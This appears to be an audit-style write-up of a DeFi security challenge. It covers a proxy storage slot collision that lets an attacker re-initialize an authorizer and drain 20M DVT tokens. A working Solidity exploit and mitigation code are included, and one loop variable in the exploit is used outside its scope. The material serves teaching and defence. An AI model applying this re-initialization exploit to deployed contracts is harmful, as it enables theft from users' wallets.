### [H-1] Storage slot collision between TransparentProxy and AuthorizerUpgradeable allows re-initialization of the authorizer

**Description:** `TransparentProxy` declares `address public upgrader` at storage 
slot 0. `AuthorizerUpgradeable` declares `uint256 public needsInit` at storage 
slot 0. When the proxy `delegatecall`s the implementation, the implementation's 
code runs against the proxy's storage — meaning `AuthorizerUpgradeable.init()` 
reads the proxy's slot 0 (the `upgrader` address) as `needsInit`. Since `upgrader` 
is a non-zero address, `require(needsInit != 0)` passes, allowing anyone to call 
`init()` on the proxy and overwrite the authorized wards mapping with arbitrary 
entries.

**Impact:** An attacker can re-initialize the authorizer to authorize themselves 
for any target deployment address — including `USER_DEPOSIT_ADDRESS`. This bypasses 
the intended access control in `WalletDeployer.drop()`, enabling unauthorized wallet 
deployment and token reward collection. Combined with CREATE2 address prediction 
and Safe transaction signing, an attacker can drain both the deposit address tokens 
(20M DVT) and the wallet deployer reward balance (1 DVT) in a single transaction.

**Proof of Concept:**
1. Call `AuthorizerUpgradeable(authorizer).init([attacker], [USER_DEPOSIT_ADDRESS])`
   — proxy slot 0 contains non-zero `upgrader` address, read as `needsInit`, 
   `require` passes, attacker is now authorized.
2. Brute-force nonces off-chain to find which nonce produces `USER_DEPOSIT_ADDRESS` 
   via `SafeProxyFactory.createProxyWithNonce()` CREATE2 formula.
3. Call `walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce)` — 
   attacker is authorized, wallet deploys at exact address, attacker receives 
   1 DVT reward.
4. Sign an EIP-712 Safe transaction using `userPrivateKey` to transfer 20M DVT 
   from the deployed wallet to `user`.
5. Execute the Safe transaction via `Safe.execTransaction()` — user never sends 
   a transaction themselves.
6. Forward the 1 DVT reward to `ward`.

<details>
<summary>Example Code Snippet</summary>

```solidity
// Step 1: re-initialize authorizer — slot collision makes needsInit check pass
address[] memory newWards = new address[](1);
newWards[0] = address(this);
address[] memory newAims = new address[](1);
newAims[0] = USER_DEPOSIT_ADDRESS;
AuthorizerUpgradeable(address(authorizer)).init(newWards, newAims);

// Step 2: brute-force nonce
bytes32 deploymentHash = keccak256(abi.encodePacked(
    proxyFactory.proxyCreationCode(),
    uint256(uint160(address(singletonCopy)))
));
for (uint256 nonce = 0; nonce < 1000; nonce++) {
    bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
    address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
        bytes1(0xff), address(proxyFactory), salt, deploymentHash
    )))));
    if (predicted == USER_DEPOSIT_ADDRESS) break;
}

// Step 3: deploy wallet and collect reward
walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);

// Step 4 & 5: sign and execute Safe transaction
bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
    address(token), 0, transferData, Enum.Operation.Call,
    0, 0, 0, address(0), address(0),
    Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
    address(token), 0, transferData, Enum.Operation.Call,
    0, 0, 0, address(0), payable(address(0)),
    abi.encodePacked(r, s, v)
);

// Step 6: forward reward to ward
token.transfer(ward, token.balanceOf(address(this)));
```
</details>

**Recommended Mitigation:**
1. Align storage layouts between proxy and implementation — the proxy must not 
   declare any state variables that overlap with the implementation's slots. Use 
   ERC-7201 namespaced storage or OpenZeppelin's `Initializable` pattern which 
   reserves slot 0 for an `_initialized` flag that both proxy and implementation 
   agree on.
2. Use OpenZeppelin's `UUPSUpgradeable` or `TransparentUpgradeableProxy` which 
   have battle-tested storage layouts with no slot collisions.
3. Add an `onlyOwner` or role-based guard to `init()` rather than relying solely 
   on a `needsInit` flag — a flag stored in a colliding slot can never be trusted.

<details>
<summary>Mitigation Code</summary>

```solidity
// Fix: use ERC-7201 namespaced storage to avoid slot collisions
// In AuthorizerUpgradeable:
bytes32 private constant STORAGE_SLOT = 
    keccak256("authorizer.upgradeable.storage");

struct AuthorizerStorage {
    uint256 needsInit;
    mapping(address => mapping(address => uint256)) wards;
}

function _getStorage() private pure returns (AuthorizerStorage storage s) {
    bytes32 slot = STORAGE_SLOT;
    assembly { s.slot := slot }
}

function init(address[] memory _wards, address[] memory _aims) external {
    AuthorizerStorage storage s = _getStorage();
    require(s.needsInit != 0, "cannot init");
    for (uint256 i = 0; i < _wards.length; i++) {
        s.wards[_wards[i]][_aims[i]] = 1;
    }
    s.needsInit = 0;
}
```
</details>